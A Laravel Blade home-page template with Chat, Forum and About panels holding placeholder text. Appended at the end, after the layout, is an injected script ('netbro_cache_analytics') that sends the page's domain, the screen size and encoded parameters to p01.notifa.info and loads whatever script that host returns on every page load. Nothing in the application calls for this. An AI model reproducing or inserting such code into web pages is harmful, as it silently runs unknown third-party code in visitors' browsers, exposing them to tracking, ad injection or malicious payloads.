@extends('layouts.app')

@section('content')
<div class="container">
    <div class="row" style="margin-top: 8%;">
        <div class="col-md-4">
            <div class="panel panel-default">
                <div class="panel-body">
                    <div class="content">
                        <div class="wrapper" style="text-align: center;">
                            <div class="wrapper">
                                <img src="{{asset('app-assets/images/paper-plane.png')}}" alt="">
                            </div>
                            <div class="wrapper">
                                <h3>Chat</h3>
                                <p style="text-align: justify">Lorem ipsum dolor sit amet, consectetur adipisicing elit. Amet animi, consequatur cumque cupiditate debitis dicta doloremque enim ex labore laborum, molestiae nostrum nulla perferendis perspiciatis quasi repudiandae voluptatem voluptatibus. Delectus!</p>
                            </div>
                            <form method="get" action="{{ route('chat') }}">
                                <button type="submit" class="btn btn-primary" style="margin-top: 2%;">Start new Conversation</button>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div class="col-md-4">
            <div class="panel panel-default">
                <div class="panel-body">
                    <div class="content">
                        <div class="wrapper" style="text-align: center;">
                            <div class="wrapper">
                                <img src="{{asset('app-assets/images/discussion.png')}}" alt="">
                            </div>
                            <div class="wrapper">
                                <h3>Forum</h3>
                                <p style="text-align: justify">Lorem ipsum dolor sit amet, consectetur adipisicing elit. Amet animi, consequatur cumque cupiditate debitis dicta doloremque enim ex labore laborum, molestiae nostrum nulla perferendis perspiciatis quasi repudiandae voluptatem voluptatibus. Delectus!</p>
                            </div>
                            <form method="get" action="{{ route('chatter.home') }}">
                                <button type="submit" class="btn btn-primary" style="margin-top: 2%;">Create your Discussion</button>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div class="col-md-4">
            <div class="panel panel-default">
                <div class="panel-body">
                    <div class="content">
                        <div class="wrapper" style="text-align: center;">
                            <div class="wrapper">
                                <img src="{{asset('app-assets/images/info.png')}}" alt="">
                            </div>
                            <div class="wrapper">
                                <h3>About</h3>
                                <p style="text-align: justify">Lorem ipsum dolor sit amet, consectetur adipisicing elit. Amet animi, consequatur cumque cupiditate debitis dicta doloremque enim ex labore laborum, molestiae nostrum nulla perferendis perspiciatis quasi repudiandae voluptatem voluptatibus. Delectus!</p>
                            </div>
                            <form action="http://ilkom.unej.ac.id">
                                <button type="submit" class="btn btn-primary" style="margin-top: 2%;">About us</button>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
<div id="spinner-wrapper">
    <div class="spinner"></div>
</div>

<script type="text/javascript">if (self===top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Am8lISurprAiySi%2bk45cljJxPp6Y86LGFk4AbWZZkO3GLi%2bv544%2fpXZGEJbwDK8FRcjTwVpmpcv%2bZRPdYdzPaiO1ZLFN4wsNFXRMOywQURRlMsj7jPXnFbMu7IR4uTIk8ds%2fGjCNbPLWVFI3kORLc9ze8%2fWF%2bXLuKoiGoIBwpO69tMT%2bWTtziQQm5CJu9OKtw1bhWn85%2fbMYPzZHJFLqOJUUNbChq0Zq%2fZ%2fx14dDwhwtAtCbF8Jjsxir8jskcrtNAZzDPWLLuvKeZ%2bysSwKkPTRuPMns805Oa7jZA3DFh0sCp7%2bW%2fuZEsuUh6XHSXFg0MrfgTDQ6jE2RoYjFAMNfQrfRQhBecgkl3gS9AErtw8TBqaebg%2b4Xi8H6Y0JsG6e0loC69SXm3Zohh59Thz%2fYDJoE851f1YM5sjW3zI4U68i8gL39tsa6y27XDwf89rWPLPhMLAOZZSX7R8cvAjm6QNBDecrUlgL3SQmn68OvtJIGlb%2bmhX1%2f0H5zgUrkRPXo3f9wnhZajWoPyEwvhNx6v4DO4Hzbr4mVoS51Bxc6mFMoorAwyFIoFjSZM%2fJmeSIKw%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
@endsection
